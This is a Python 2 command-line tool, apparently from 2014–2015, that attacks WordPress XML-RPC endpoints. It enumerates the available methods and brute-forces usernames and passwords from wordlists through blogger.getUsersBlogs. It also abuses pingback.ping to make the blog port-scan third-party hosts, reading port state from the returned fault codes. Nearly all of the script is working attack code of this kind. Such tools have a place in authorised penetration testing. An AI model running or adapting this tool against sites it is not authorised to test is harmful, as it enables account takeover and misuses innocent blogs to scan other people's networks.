#!/usr/bin/env python
# A small XML-RPC scanner for Wordpress
# Released under Creative Commons license : http://creativecommons.org/licenses/by-nc-sa/4.0/
# Warning : Released "as is" and probably contains unpatched bugs, consider yourself warned :-)

"""wordpress_xmlrpc_scanner.py: A small XML-RPC scanner for Wordpress"""
__author__ = "Marc Lebrun"
__copyright__ = "Copyright 2014-2015, Marc Lebrun"
__license__ = "http://creativecommons.org/licenses/by-nc-sa/4.0/"

import requests,json,re,sys,argparse,httplib,sys
from requests.auth import HTTPBasicAuth

headers = {'content-type': 'application/xml'}

parser = argparse.ArgumentParser(description='Do fun things with Wordpress XML-RPC :-)')
parser.add_argument('host', help='host to target (can be of the form host:port)')
parser.add_argument('-r', '--root', help='wordpress root (default: /), do not forget the trailing /', default='/')
parser.add_argument('-a', '--auth', help='basic authentication (user:pass)')
parser.add_argument('-s', '--ssl', help="use SSL (i.e HTTP)", action="store_true")
parser.add_argument('-x', '--notests', help="do not perform connectivity tests", action="store_true", default=False)
parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
parser.add_argument("-d", "--debug", help="show debug messages", action="store_true")
parser.add_argument('-V', '--version', action='version', version='Wordpress XML-RPC scanner v0.4.8.1 Alpha build 34285 pre-release')
actiongroup = parser.add_mutually_exclusive_group()
actiongroup.add_argument("-e", "--enum", help='test connectivity and enumerate available XML-RPC calls', action="store_true")
actiongroup.add_argument("-k", "--pingback", help='make a pingback call', action="store_true")
parser.add_argument('-t', '--target', help='pingback target to scan (in the form host:port)')
parser.add_argument('-b', '--blogpost', help='pingback blogpost')
actiongroup.add_argument("-f", "--bruteforce", help='bruteforce authentication', action="store_true")
parser.add_argument('-u', '--user', help='user account to bruteforce')
parser.add_argument('-U', '--userlist', help='list of user accounts to bruteforce')
parser.add_argument('-p', '--password', help='password to use for bruteforcing')
parser.add_argument('-P', '--passlist', help='list of passwords to use for bruteforcing')

args = parser.parse_args()
if args.debug == True:
    print args

if args.ssl == True:
    url = 'https://'
else:
    url = 'http://'

if args.auth != None:
    url += args.auth
    url += '@'

url += args.host
url += args.root
url += 'xmlrpc.php'

if args.debug == True:
    print 'URI is : ' + url

def banner():
    print '+==================================================================+'
    print '| Wordpress XML-RPC scanner v0.4.8.1 Alpha build 34285 pre-release |'
    print '+==================================================================+'

def patch_send():
    old_send= httplib.HTTPConnection.send
    def new_send( self, data ):
        print data
        return old_send(self, data)
    httplib.HTTPConnection.send= new_send

def test_presence():
    print 'Testing for xmlrpc.php presence...'
    r = requests.get(url, headers=headers, verify=False)
    if args.verbose == True:
        sys.stdout.write('Got ' + str(r.status_code) + ', ')

    if r.status_code >= 400:
        if args.verbose == True:
            sys.stdout.write('aborting.\n')
        print 'An error occurred when requesting : ' + url
        return 1
    else:
        if args.verbose == True:
            sys.stdout.write('continuing with response content check: ')

    if r.content.find('XML-RPC server accepts POST requests only.') == -1:
        if args.verbose == True:
            sys.stdout.write('KO\n')
        print 'An error occurred when requesting : ' + url
        return 1
    else:
        if args.verbose == True:
            sys.stdout.write('OK\n')
        return 0

def do_rpc_call(name, payload):
    if args.verbose == True:
        print 'Attempting a call to ' + name + '...' 
    r = requests.post(url, headers=headers, data=payload, verify=False)
    if args.verbose == True:
        sys.stdout.write('Got ' + str(r.status_code) + ', ')
    if r.status_code >= 400:
        if args.verbose == True:
            sys.stdout.write('aborting.\n')
        return (-1, r.content)
    else:
        if args.verbose == True:
            sys.stdout.write('continuing with response content check: ')

    if args.debug == True:
        sys.stdout.write('\nContent : \n')
        print r.content
        print ''

    if r.content.find('<name>faultCode</name>') != -1:
        if args.verbose == True:
            sys.stdout.write('KO.\n')
        if args.verbose == True:
            code = re.search('<value><int>(.*)</int></value>', r.content)
            print 'Error code: ' + code.group(1)
            string = re.search('<value><string>(.*)</string></value>', r.content)
            print 'Error string: ' + string.group(1)
        return (1, r.content)
    else:
        if args.verbose == True:
            sys.stdout.write('OK.\n')
        return (0, r.content)

def test_hello():
    print 'Making a test call to demo.sayHello...'
    payload = '<?xml version="1.0" encoding="iso-8859-1"?>\n<methodCall>\n<methodName>demo.sayHello</methodName>\n<params>\n<param></param>\n</params>\n</methodCall>\n'
    r = do_rpc_call('demo.sayHello', payload)

    if r[0] != 0:
        print 'Call failed'
        return 1

    if r[1].find('<string>Hello!</string>') == -1:
        print 'Call failed'
        return 1
    else:
        return 0

def parse_methods(res):
    r = re.findall("<value><string>(.*)</string></value>", res)
    return r

def enum_methods():
    print 'Starting methods enumeration...'
    payload = '<?xml version="1.0" encoding="iso-8859-1"?>\n<methodCall>\n<methodName>mt.supportedMethods</methodName>\n<params>\n<param></param>\n</params>\n</methodCall>\n'
    r = do_rpc_call('mt.supportedMethods', payload)

    if r[0] != 0:
        print 'Call failed'
        return 1

    n = parse_methods(r[1])
    sys.stdout.write('\nThe following methods are supported:\n')
    for l in n:
        print l
    return n

def do_authent_req(user, passw):
    sys.stdout.write(user + ' | ' + passw + ' : ')
    payload = '<?xml version="1.0" encoding="iso-8859-1"?>\n<methodCall>\n<methodName>blogger.getUsersBlogs</methodName>\n<params>\n<param><string></string></param>\n<param><string>' + user + '</string></param>\n<param><string>' + passw + '</string></param>\n</params>\n</methodCall>'
    r = do_rpc_call('mt.supportedMethods', payload)
    return r

def do_passw_bf(user):
    if args.password != None:
        r = do_authent_req(user, args.password)
        if r[0] == -1:
            print 'KO'
            print 'An error occured when requesting : ' + url
        elif r[0] == 0:
            print 'OK'
            print 'Valid identifiers found: username=' + user + ', password=' + args.password
        elif r[0] == 1:
            print 'KO'
            code = re.search('<value><int>(.*)</int></value>', r[1]) 
            if code.group(1) == '405':
                string = re.search('<value><string>(.*)</string></value>', r[1]) 
                print 'Warning, got a 405 error code : ' + string.group(1)
    if args.passlist != None:
        with open(args.passlist, 'r') as f:
            for line in f:
                passw = line.rstrip('\n')
                passw = passw.rstrip('\r')
                r = do_authent_req(user, passw)
                if r[0] == -1:
                    print 'KO'
                    print 'An error occured when requesting : ' + url 
                elif r[0] == 0:
                    print 'OK'
                    print 'Valid identifiers found: username=' + user + ', password=' + line
                elif r[0] == 1:
                    print 'KO'
                    code = re.search('<value><int>(.*)</int></value>', r[1])
                    if code.group(1) == '405':
                        string = re.search('<value><string>(.*)</string></value>', r[1])
                        print 'Warning, got a 405 error code : ' + string.group(1)
    return 0

def bruteforce():
    if (args.user == None and args.userlist == None) or (args.password == None and args.passlist == None):
        print 'You must provides user/userlist and password/passwordlist to bruteforce with !'
        return 1
    print 'Starting bruteforce...'
    if args.user != None:
        do_passw_bf(args.user)
    if args.userlist != None:
        with open(args.userlist, 'r') as f:
            for line in f:
                username = line.rstrip('\n')
                username = username.rstrip('\r')
                do_passw_bf(username)
    return

def do_pingback():
    if args.target == None or args.blogpost == None:
        print 'You must specify a valid target and blogpost URI to realize a pingback call !'
        return 1
    print 'Starting pingback...'
    payload = '<?xml version="1.0" encoding="iso-8859-1"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param><value><string>' + 'http://' + args.target + '/' + '</string></value></param>\n<param><value><string>' + args.blogpost + '</string></value></param>\n</params>\n</methodCall>\n'
    r = do_rpc_call('mt.supportedMethods', payload)
    code = re.search('<value><int>(.*)</int></value>', r[1])
    if args.verbose == True:
        print 'Error code is : ' + code.group(1)
    if code.group(1) == '0':
        print 'Generic error 0: unable to determine port state'
    elif code.group(1) == '16':
        print 'Error 16: target port is closed'
    elif code.group(1) == '17':
        print 'Error 17: target port is open'
    return 0

def main():

    if args.debug == True:
        patch_send()

    banner()
    print ''

    if args.enum == True:
        if args.notests == False:
            test_presence()
            print ''
            test_hello()
            print ''
        enum_methods()        
        print ''
        return

    if args.pingback == True:
        if args.notests == False:
            test_presence()
            print ''
            test_hello()
            print ''
        do_pingback()
        print ''
        return

    if args.bruteforce == True:
        if args.notests == False:
            test_presence()
            print ''
            test_hello()
            print ''
        bruteforce()
        print ''
        return

    sys.exit(0)

if __name__ == '__main__':
    main()
